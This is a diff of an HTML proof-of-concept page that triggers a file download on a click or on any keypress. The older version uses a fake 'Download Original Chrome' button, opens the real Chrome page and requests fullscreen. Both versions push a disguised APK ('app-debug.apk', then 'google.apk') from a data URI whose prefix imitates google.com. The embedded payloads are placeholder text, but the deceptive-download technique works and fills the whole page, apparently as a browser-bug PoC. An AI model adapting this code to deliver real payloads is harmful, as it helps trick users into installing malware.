@@ -2,35 +2,21 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PoC k4tedu</title>
-  <style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-  </style>
+  <title>Download & Fullscreen on Keypress</title>
 </head>
 <body>
-  <center><h2>POC by Francesco!</h2></center>
-  <center><input type="button" class="button" id="triggerInput" value="Download Original Chrome"></center>
+  <center><h2>POC by Chigorin!</h2></center>
+
   <script>
-    
-    document.getElementById('triggerInput').addEventListener('click', function() {
+    // Listen to any keydown
+    window.addEventListener('keydown', function(e) {
+      // open the download
+      openWin();
       // request fullscreen
- setTimeout(function() {
-        openWin();
- }, 2000);
- window.open('https://www.google.com/intl/id_id/chrome/', '_blank');
-      goFullScreen();
-    }, { once: false });
+      //goFullScreen();
+    });
+
+    // Download helper
     function Puf(uri, name) {
       const link = document.createElement("a");
       link.href = uri;
@@ -39,26 +25,13 @@
       link.click();
       document.body.removeChild(link);
     }
-    // Kick off your “exe” download
+
+    // Kick off your “APK” download
     function openWin() {
       Puf(
-        "data://google.com/application/x-msdownload;base64,WW91IEhhdmUgQmVlbiBIYWNrZWQ=",
-        "app-debug.apk"
+        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "google.apk"
       );
-    }
-    function goFullScreen() {
-      const element = document.documentElement;
-      if (element.requestFullscreen) {
-        element.requestFullscreen();
-      } else if (element.mozRequestFullScreen) {
-        element.mozRequestFullScreen();
-      } else if (element.webkitRequestFullscreen) {
-        element.webkitRequestFullscreen();
-      } else if (element.msRequestFullscreen) {
-        element.msRequestFullscreen();
-
-      }
-
     }
 
   </script>
